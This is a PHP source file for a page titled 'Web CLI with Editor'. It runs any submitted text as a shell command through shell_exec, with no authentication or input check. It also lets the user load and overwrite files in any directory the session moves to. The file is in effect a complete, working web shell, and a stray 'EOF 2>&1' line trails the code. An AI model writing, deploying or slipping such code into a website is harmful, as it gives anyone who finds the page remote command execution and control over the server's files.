<?php
session_start();

// Set a default working directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // default to current PHP dir
}

$cwd = $_SESSION['cwd'];
$output = '';
$command = '';
$fileContent = '';
$fileName = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['save_file']) && isset($_POST['file_name'])) {
        // Save file content
        $fileName = $cwd . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
        file_put_contents($fileName, $_POST['file_content']);
        $output = "File saved: " . htmlspecialchars($fileName);
    } elseif (isset($_POST['load_file']) && isset($_POST['file_name'])) {
        // Load file content
        $fileName = $cwd . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
        if (is_file($fileName)) {
            $fileContent = htmlspecialchars(file_get_contents($fileName));
        } else {
            $output = "File not found: " . htmlspecialchars($fileName);
        }
    } elseif (isset($_POST['command'])) {
        // Shell command handling
        $command = trim($_POST['command']);
        if (preg_match('/^cd\s+(.*)/', $command, $matches)) {
            $newDir = $matches[1];
            $newPath = realpath($cwd . DIRECTORY_SEPARATOR . $newDir);
            if ($newPath && is_dir($newPath)) {
                $_SESSION['cwd'] = $newPath;
                $cwd = $newPath;
                $output = "Directory changed to: $cwd";
            } else {
                $output = "No such directory: $newDir";
            }
        } else {
            $output = shell_exec("cd " . escapeshellarg($cwd) . " && " . $command . " 2>&1");
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web CLI with Editor</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #cfcfcf; padding: 20px; }
        textarea, input[type="text"] {
            width: 100%; font-family: monospace; background: #2b2b2b; color: #fff;
            padding: 10px; border: none; resize: vertical;
        }
        pre {
            background: #000; color: #0f0; padding: 15px; overflow-x: auto;
        }
        .output { margin-top: 20px; }
        .editor { margin-top: 40px; }
    </style>
</head>
<body>
    <h2>Web CLI</h2>
    <p><strong>Current Directory:</strong> <?= htmlspecialchars($cwd) ?></p>
    <form method="post">
        <textarea name="command" rows="5" placeholder="Enter command (e.g., cd /var, ls -la)"><?= htmlspecialchars($command) ?></textarea><br><br>
        <button type="submit">Run</button>
    </form>

    <?php if (!empty($output)): ?>
        <div class="output">
            <h3>Output:</h3>
            <pre><?= htmlspecialchars($output) ?></pre>
        </div>
    <?php endif; ?>

    <div class="editor">
        <h2>File Editor ("Nano")</h2>
        <form method="post">
            <input type="text" name="file_name" placeholder="Enter filename to load/edit (e.g., test.txt)" value="<?= htmlspecialchars($fileName) ?>"><br><br>
            <button type="submit" name="load_file">Load File</button>
        </form>

        <?php if (!empty($fileContent) || isset($_POST['load_file'])): ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?= htmlspecialchars($fileName) ?>">
                <textarea name="file_content" rows="15"><?= $fileContent ?></textarea><br><br>
                <button type="submit" name="save_file">Save File</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
EOF 2>&1
